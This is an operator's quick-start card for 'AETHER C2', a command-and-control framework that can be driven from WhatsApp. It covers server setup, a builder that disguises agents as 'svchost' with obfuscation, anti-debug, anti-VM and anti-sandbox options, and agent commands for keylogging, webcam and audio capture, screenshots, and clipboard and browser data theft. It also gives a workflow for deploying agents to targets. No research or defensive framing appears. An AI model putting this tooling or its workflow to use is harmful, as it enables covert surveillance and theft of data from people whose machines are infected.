
# AETHER C2 - Quick Start Reference Card

## 🚀 5-Minute Setup

### Prerequisites Checklist
```bash
python3 --version        # Need 3.8+
pip3 --version           # Need pip
node --version           # Optional for WhatsApp (need 16+)
npm --version            # Optional for WhatsApp
```

### Auto Setup (Recommended)

#### Option A: Bash Script (Linux/Mac)
```bash
bash quickstart.sh
```

#### Option B: Interactive Wizard (All Platforms)
```bash
python3 MASTER_SETUP.py
# Follow prompts to configure everything
```

#### Option C: Manual Setup
```bash
# Install dependencies
pip3 install -r requirements.txt

# Install bot (optional)
cd WA-BOT-Base && npm install && cd ..

# Done!
```

---

## 📋 Startup Checklist

### Terminal 1: Start C2 Server
```bash
cd /path/to/aether
python3 server/aether_server.py

# Expected output:
# ╔═╗╔═╗╔╦╗╔═╗╦  ╔═╗╦═╗
# AETHER> _
```

### Terminal 2: Start WhatsApp Bot (Optional)
```bash
cd WA-BOT-Base
npm start

# Expected output:
# Scan with WhatsApp in 45 seconds
# ████████████████████ 100%

# Then on your phone:
# WhatsApp → Settings → Linked Devices → Scan QR
```

### Terminal 3: Monitor (Optional)
```bash
tail -f aether.log
```

---

## 💻 Basic Operations

### Check Server Status
```
AETHER> sessions
AETHER> info
AETHER> config
```

### Control an Agent
```
AETHER> interact agent_001
agent_001> whoami
agent_001> screenshot
agent_001> back
```

### Build an Agent
```
AETHER> generate
# Or manually:
python3 builder/compile.py
```

### Enable WhatsApp Control
```
AETHER> whatsapp enable
AETHER> whatsapp status
```

---

## 📱 WhatsApp Commands

### From Your Phone

```
Authentication:
  auth aether2025                    → Authenticate

Session Management:
  sessions                           → List agents
  link agent_001                     → Connect to agent
  status                             → Current session

System Recon:
  whoami                             → Current user
  hostname                           → Computer name
  sysinfo                            → System info
  ps                                 → Processes

File Operations:
  ls C:\Users\admin\Documents        → List directory
  cat C:\path\file.txt               → Read file
  download C:\path\file.exe          → Download
  upload /path/local/file.txt        → Upload

Intelligence:
  screenshot                         → Take screenshot
  webcam                             → Capture webcam
  audio 30                           → Record 30 sec
  keylog                             → Keystrokes
  clipboard                          → Get clipboard
  browser                            → Browser data

Help:
  help                               → Command list
  history                            → Your commands
```

---

## ⚙️ Configuration Files

### `config.json` - Main Server Config
```json
{
  "c2_host": "0.0.0.0",
  "c2_port": 443,
  "c2_protocol": "https",
  "encryption_key": "CHANGE_THIS_TO_RANDOM_64_CHARS",
  
  "agent": {
    "c2_host": "target-domain.com",
    "c2_port": 443,
    "beacon_interval": 30
  },
  
  "builder": {
    "output_name": "svchost",
    "use_pyarmor": true,
    "obfuscation_level": "high"
  }
}
```

### `server/comms/whatsapp_config.py` - WhatsApp
```python
WHATSAPP_CONFIG = {
    'bot_url': 'http://localhost:3000',
    'auth_password': 'aether2025',          # CHANGE THIS!
    'authorized_users': ['+1234567890'],    # Your phone
}
```

### `WA-BOT-Base/aether-bridge.js` - Bot Bridge
```javascript
const config = {
    aetherHost: 'http://localhost',
    aetherPort: 5000,
    commandTimeout: 30000,
};
```

---

## 🔧 Common Tasks

### Change Server Port
```json
// In config.json
"c2_port": 8443
```

### Change WhatsApp Password
```python
# In server/comms/whatsapp_config.py
'auth_password': 'NewSecurePassword123'
```

### Add Authorized WhatsApp User
```python
# In server/comms/whatsapp_config.py
'authorized_users': [
    '+1234567890',
    '+0987654321',  # Add new number
]
```

### Use Different C2 Domain
```json
// In config.json
"agent": {
    "c2_host": "your-domain.com"
}
```

### Enable Anti-Debug in Agent
```json
// In config.json
"builder": {
    "add_anti_debug": true,
    "add_anti_vm": true,
    "add_anti_sandbox": true
}
```

---

## 🐛 Troubleshooting

### Port Already in Use
```bash
# Find what's using port 443
netstat -ano | findstr :443
# Kill process: taskkill /PID <pid> /F
# Or use different port in config.json
```

### "Module not found" Error
```bash
pip3 install -r requirements.txt
# Or specific module:
pip3 install cryptography
```

### Agent Not Connecting
1. Check C2 is running: `netstat -an | grep 443`
2. Check firewall allows 443
3. Verify agent config has correct host
4. Test connectivity: `ping target-domain.com`

### WhatsApp Bot Not Responding
1. Is bot running? Check `npm start` terminal
2. QR code scanned? Should see "Bot is ready!"
3. Is AETHER WhatsApp enabled? `AETHER> whatsapp status`
4. Did you authenticate? Send: `auth aether2025`
5. Is your number authorized? Check `whatsapp_config.py`

### Bot Stuck on QR Code
```bash
# Delete auth and restart
rm -rf WA-BOT-Base/auth_info_baileys
cd WA-BOT-Base && npm start
# Scan new QR code
```

---

## 📖 Documentation Files

```
MASTER_SETUP.py                    ← Interactive setup wizard
quickstart.sh                      ← Auto-setup script (Linux/Mac)
COMPLETE_CONFIG_GUIDE.md           ← Detailed configuration
COMPLETE_DEPLOYMENT_GUIDE.md       ← Full deployment guide
WHATSAPP_BOT_INTEGRATION.md        ← WhatsApp integration guide
README.md                          ← Project overview
```

---

## 🔐 Security Checklist

Before Production:
- [ ] Change encryption_key in config.json
- [ ] Change auth_password in whatsapp_config.py  
- [ ] Update agent c2_host to real domain/IP
- [ ] Set authorized_users whitelist
- [ ] Enable obfuscation in builder
- [ ] Configure firewall rules
- [ ] Test in isolated environment first
- [ ] Remove default credentials
- [ ] Enable logging for audit trail

---

## ⚡ Power User Commands

### Broadcast to All Agents
```
AETHER> broadcast "ps"
```

### Build Agent with Custom Name
```bash
python3 builder/compile.py --output myagent.exe
```

### Use Virtual Environment (Recommended)
```bash
python3 -m venv venv
source venv/bin/activate  # Linux/Mac
venv\Scripts\activate     # Windows
pip install -r requirements.txt
```

### Keep Server Running (Linux)
```bash
nohup python3 server/aether_server.py > aether.log 2>&1 &
```

### Run Bot with PM2 (Persistent)
```bash
npm install -g pm2
cd WA-BOT-Base
pm2 start main.js --name aether-bot
pm2 logs aether-bot
```

---

## 🎯 Typical Workflow

### Day 1: Initial Setup
```bash
# 1. Quick setup
bash quickstart.sh

# 2. Start server
python3 server/aether_server.py

# 3. Start bot
cd WA-BOT-Base && npm start

# 4. Build agent
AETHER> generate
```

### Day 2: Deployment & Control
```bash
# 1. Deploy agent to target
# 2. Agent connects to C2
AETHER> sessions
# 3. Interact with agent
AETHER> interact agent_001
agent_001> whoami
agent_001> screenshot
```

### Day 3: Remote Control via WhatsApp
```bash
# From phone:
You: auth aether2025
You: link agent_001
You: whoami
# Response: DOMAIN\admin
```

---

## 📊 Default Credentials

```
AETHER Server Console Password: [auto-generated]
WhatsApp Auth Password: aether2025
WhatsApp Default Users: []  (you must configure)
```

**⚠️ Change all defaults before production!**

---

## 🆘 Quick Help

```
AETHER> help              # Show all commands
AETHER> sessions          # List agents
AETHER> interact <id>     # Connect to agent
AETHER> whatsapp enable   # Enable WhatsApp
AETHER> whatsapp status   # Check WhatsApp
AETHER> generate          # Build agent
AETHER> exit              # Shutdown server
```

---

## 📱 WhatsApp Quick Reference

| Task | Command |
|------|---------|
| Authenticate | `auth aether2025` |
| List agents | `sessions` |
| Connect | `link agent_001` |
| Your user | `whoami` |
| Computer name | `hostname` |
| Processes | `ps` |
| Screenshot | `screenshot` |
| List directory | `ls C:\` |
| Read file | `cat C:\file.txt` |
| Download | `download C:\file.exe` |
| Get clipboard | `clipboard` |
| Browser data | `browser` |
| Help | `help` |

---

## 🚨 Emergency Procedures

### Stop All Services
```bash
# Kill server
ps aux | grep aether_server
kill -9 <pid>

# Kill bot
npm stop
# or
pm2 stop aether-bot
```

### Reset All Configurations
```bash
rm config.json
rm server/comms/whatsapp_config.py
rm .aether_config.json
# Then rerun setup
python3 MASTER_SETUP.py
```

### Clear Bot Authentication
```bash
rm -rf WA-BOT-Base/auth_info_baileys
rm -rf WA-BOT-Base/.wwebjs_cache
```

---

## 📞 Support Resources

- **Main Guides**: See COMPLETE_DEPLOYMENT_GUIDE.md
- **Configuration**: See COMPLETE_CONFIG_GUIDE.md
- **WhatsApp Help**: See WHATSAPP_BOT_INTEGRATION.md
- **Setup Wizard**: Run `python3 MASTER_SETUP.py`
- **Auto Setup**: Run `bash quickstart.sh`

---

## Version Info

```
AETHER C2 v1.0
Status: Production Ready
Last Updated: December 2025
```

---

**Keep this card handy during operations!**

